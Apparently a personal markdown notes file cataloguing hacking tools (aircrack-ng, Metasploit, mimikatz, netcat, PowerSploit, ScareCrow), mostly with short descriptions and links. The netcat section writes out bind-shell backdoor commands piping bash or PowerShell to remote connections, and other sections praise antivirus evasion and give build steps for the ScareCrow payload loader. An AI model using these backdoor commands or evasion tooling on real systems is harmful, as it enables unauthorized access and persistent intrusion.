
> Tags

|     |     |
| --- | --- |
|     |     |
# Table of Contents

| Name of Tools   | Short-Description                                                                | Reference        |
| --------------- | -------------------------------------------------------------------------------- | ---------------- |
| aircrack-ng     | aircrack-ng suite is the premier wireless technology analysis and cracking tool  | [[#aircrack-ng]] |
| BeeF            | BeeF is the Browser Exploitation Framework                                       | [[#BeeF]]        |
| burpsuit        | BurpSuite is an excellent tool for attacking web applications                    | [[#burpsuit]]    |
| evildroid       |                                                                                  | [[#evildroid]]   |
| hashcat         | hashcat is a Linux-based password cracker                                        | [[#hashcat]]     |
| john-the-ripper | John the Ripper is the granddaddy of Linux based password cracking tools         |                  |
| metasploit      | metasploit is the work's most popular exploitation framework developed by rapid7 | [[#metasploit]]  |
| mimikatz        | powerful credentials stealing-tool                                               | [[#mimikatz]]    |
| nessus          | most popular vulnerability scanner                                               |                  |
| netcat          |                                                                                  | [[#netcat]]      |
| ollyDbg         | used to analyze and decipher software where the source code is unavailable       | [[#ollyDbg]]     |
| powersploit     | a formidable ally in our efforts to take control of a window-system              | [[#powersploit]] |
| scarecrow       |                                                                                  | [[#ScareCrow]]   |
| shodan          | world's most dangerous search engine                                             |                  |
| sqlmap          | best tool for automating SQL injection (SQLi) attacks against web forms          |                  |
| the-hydra       | one of the leading remote password cracking tools                                |                  |
| wireshark       | wireshark is a packet sniffer and analyzer                                       |                  |

---
> Syntax

```javascript
# Hacking-Tools
## name-of-the-hacking-tool
- tag ( to easily info retreival )
- description ( of what does this hacking tool do )
```

# Hacking-Tools

## aircrack-ng

#os/linux/tools/hacking/aircrack-ng

aircrack-ng suite is the premier wireless technology analysis and cracking tool. Many of the other Wi-Fi tools on the market are simply scripts and GUI's that enable the use of aircrack-ng. aircrack-ng is a suite of tools for monitoring, dumping, cracking, and even creating an Evil Twin and more.

---
## BeeF

BeeF is the Browser Exploitation Framework. This tool enables the attacker to exploit the target's browser and then conduct a multitude of nefarious activities in their browser.

---
## burpsuit 

BurpSuite is an excellent tool for attacking web applications. It has numerous tools integrated into this suite all for attacking a web application.

---
## evildroid

> Resouces

1. [Git-Clone > Evil-Droid by M4sc3r4n0](https://github.com/M4sc3r4n0/Evil-Droid)
2. [Google Now Launcher](https://www.apkmirror.com/apk/google-inc/google-now-launcher/google-now-launcher-1-4-large-release/google-now-launcher-1-4-large-android-apk-download/)
3. [How To Automatically Embed Payloads In APK's - Evil-Droid, Thefatrat & Apkinjector](https://www.youtube.com/watch?v=C_Og6LnEZSg) 
4. [Android Hacking in Kali Linux Using Metasploit Framework](https://www.researchgate.net/publication/352394049_Android_Hacking_in_Kali_Linux_Using_Metasploit_Framework/fulltext/60c82b1fa6fdcc57ed0555f6/Android-Hacking-in-Kali-Linux-Using-Metasploit-Framework.pdf?origin=publication_detail) 

---
## hashcat

hashcat in another Linux-based password cracker. Although not as easy to use as John the Ripper, many consider it the world's fastest. Among it's many capabilities include using a GPU for faster cracking (hashcat 3.0).

---
## john-the-ripper

John the Ripper is the granddaddy of Linux based password cracking tools. Lightweight and fast, it can auto-detect the type of hash and then begin a dictionary attack first followed by a brute force attack, if dictionary attack fails. This command line tool is short on pretty user interfaces, but long on ease-of-use and effectiveness.

---
## metasploit

Metasploit is the work's most popular exploitation framework. It packages nearly everything you need to conduct a pentest into a single software package from scanning, exploitation and post-exploitation.

The Metasploit framework is extensible with modules for payloads, auxiliary, exploits, encoders, post-exploitation and no-operation (NOP) generators. Metasploit is free, but does have commercial versions with additional features and costs.

---
## mimikatz

> Resources

- https://www.cyberpunk.rs/mimikatz-powerful-credentials-stealing-too

---
## nessus


Nessus is the most popular vulnerability scanner. Originally developed as a open source project, it is now owned by Tenable. Nessus utilizes a vast database of known vulnerabilities and then probes the systems for evidence of their existence.

---
## the-hydra

THC-Hydra is one of the leading remote password cracking tools. It is capable of dictionary attacks against multiple protocols most notably http, https, smb and ftp.

---
## netcat

> Command Summary

| Command              | Description                                             |
| -------------------- | ------------------------------------------------------- |
| ip route get 8.8.8.8 | Get The IP Address                                      |
| nc -h                | Get Netcat Help                                         |
| nc -lvvp 4444        | Create Listener                                         |
| nc 192.168.1.35 4444 | Make Connection to the IP address on the specified Port |

> Feature > Chatting

Netcat can also be used to chat between two users. We need to establish a connection before chatting. 
To do this we are going to need two devices. One will play the role of initiator and one will be a listener to start the conversation and so once the connection is established, communication can be done from both ends. 
- First of all, we will use Windows 10 machine which will play role of Listener.
- Second we will use Kali linux machine which will play role of initiator. 
- Now, Lets create a listener. We will use the following command to create a listener: 

```javascript
## nc -lvvp 4444

# where,   
# [-l]: Listen Mode   
# [vv]: Verbose Mode {It can be used once, but we use twice to be more verbose}   
# [p]: Local Port 

Now, it’s time to create an initiator, for this we will just provide the IP Address of the System where we started the Listener followed by the port number. 

**NOTE:** Use the same port to create an initiator that was used in creating listener. 

## nc 192.168.1.35 4444 
```

> Feature > Creating a backdoor   

We can also create a backdoor using NC.
To create a backdoor on the target system that we can come back to at any time.

| Step-1 | Command for attacking a Linux System. |
| ------ | ------------------------------------- |
```javascript
nc -l -p 3556 -e /bin/bash
```

| Step-2 | For Creating Backdoor for Windows system. |
| ------ | ----------------------------------------- |
```javascript
nc -l -p 3556 -e powershell
```

This will open a listener on the system that will pipe the command shell or the Linux bash shell to the connecting system

| Step-3 | Make a Connection to the Remote Shell |
| ------ | ------------------------------------- |

```javascript
## nc 192.168.1.35 3556 
```

> Resources

1. https://www.geeksforgeeks.org/introduction-to-netcat/?ref=ml_lbp
2. https://www.maketecheasier.com/netcat-transfer-files-between-linux-computers
3. https://superuser.com/questions/98089/sending-file-via-netcat
---
## sqlmap 

sqlmap is probably the best tool for automating SQL injection (SQLi) attacks against web forms. It is capable of database fingerprinting, dumping data from the database into .csv files, and even accessing the underlying OS of the web server.

---
## ollyDbg

OllyDbg is a 32-bit (x86) debugger for Microsoft Windows. It can be used to analyze and decipher software where the source code is unavailable. OllyDbg is free to download and use.

OllyDbg is often used in reverse engineering of software as well as by programmers to make certain their programs are working as expected and for reverse engineering malware.

---
## powersploit

As hackers, PowerShell can be a formidable ally in our efforts to take control of a system. If we can access a system's PowerShell, we can use its power to control—and maintain control—of the target system. In addition, if we can run our commands and scripts in the PowerShell context, we can evade most antivirus (AV) software and leave little or no evidence behind

Fortunately for us, a series of PowerShell scripts have been developed by Matt Graeber that can help us control and manipulate a target system. These specially crafted scripts are known collectively as PowerSploit. 
Thankfully, they are built into Kali. If you are not using Kali, you can download them [here](https://www.hackers-arise.com/powersploit)

> Sources

1. https://www.hackers-arise.com/powersploit

---
## ScareCrow

> Recommended Step > Install Go-Lang Packager via apt

```javascript
sudo apt install golang-go -y
```

Before you compile [[#ScareCrow]], you'll also need to install the dependencies.

To install any other package, simply:

```javascript
go install <package_name>@<version>
```

go get github.com/fatih/color  
go get github.com/yeka/zip  
go get github.com/josephspurrier/goversioninfo  
go get github.com/Binject/debug/pe  
go get github.com/awgh/rawreader


> Doesn't Required ( ScareCrow now requires golang 1.19.1 or later to compile loaders )

Navigate to the Download Directory  
```javascript
cd ~\Downloads  
```
Download the Go-lang linux tar file  
```javascript
wget https://go.dev/dl/go1.20.5.linux-amd64.tar.gz  
```
Remove previous go-files located at /usr/local/go & extracts new file to the same location   
```javascript
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.20.5.linux-amd64.tar.gz  
```
export the path /usr/local/go/bin to the environment variable  
```javascript
export PATH=$PATH:/usr/local/go/bin  
```
Verfiy if everything was successfully  
```javascript
go version
```

> Github Repositories

|Title|github-repo|version of release|go install command|Status|
|---|---|---|---|---|
|Color|https://github.com/fatih/color|v1.15.0|go install github.com/fatih/color@v1.15.0|Installed|
|zip|https://github.com/yeka/zip|latest|go install github.com/yeka/zip@latest|Installed|
||https://github.com/josephspurrier/goversioninfo|v1.4.0|github.com/josephspurrier/goversioninfo@v1.4.0||
||https://github.com/Binject/debug/pe||go install github.com/Binject/debug/pe@latest||
||https://github.com/awgh/rawreader||go install github.com/awgh/rawreader@latest||

Make sure that the following are installed on your OS:

| Linux Package | Command to Install                 |
| ------------- | ---------------------------------- |
| openssl       | `sudo apt install openssl -y`      |
| osslsigncode  | `sudo apt install osslsigncode -y` |
| mingw-w64     | `sudo apt install mingw-w64 -y`    |

Then to the directory where you have cloned the reposiroty & build it using `sudo` priviledge

```javascript
sudo go build ScareCrow.go
```

You'll get a new File named ScareCrow, without extension. in the same directory where the file is located. type the below command

```javascript
./ScareCrow -h
```

> Resources 
- https://stackoverflow.com/questions/30295146/how-can-i-install-a-package-with-go-get

---



---
## shodan

Shodan is the world's most dangerous search engine. Shodan scans the Internet not for keywords, but instead for web banners. It pulls the banner from nearly every IP address and then indexes that banner information for searching. This is a an essential tool for finding sites that have useful characteristics such as a particular web server, operating system, type of IoT or protocol.

---
## wireshark

Wireshark is a sniffer that enables us to examine every packet and thereby analyze what is wrong with our network or what the intruder was trying to do.


---

Go Back to the [[#Table of Contents]]